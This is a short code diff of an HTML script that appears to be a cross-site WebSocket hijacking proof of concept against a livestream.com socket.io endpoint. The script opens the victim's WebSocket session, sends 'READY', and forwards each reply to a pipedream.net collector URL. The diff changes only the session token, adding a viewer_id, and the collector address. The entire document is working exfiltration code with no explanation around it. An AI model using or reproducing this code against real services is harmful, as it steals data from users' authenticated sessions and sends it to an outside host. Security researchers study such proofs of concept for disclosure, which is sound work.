@@ -1,11 +1,11 @@
 <script>
-websocket = new WebSocket('https://sio-1.livestream.com/socket.io/1/websocket/EsJal6DHeyLV2Z6mKqSS')
+websocket = new WebSocket('https://sio-1.livestream.com/socket.io/1/websocket/UIqRU6gYJ7Ee47qXHwM7?viewer_id=29118900')
 websocket.onopen = start
 websocket.onmessage = handleReply
 function start(event) {
   websocket.send("READY");
 }
 function handleReply(event) {
-  fetch('https://en18j8t9h8ey.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
+  fetch('https://enukko0qkgmzd.x.pipedream.net/?'+event.data, {mode: 'no-cors'})
 }
 </script>
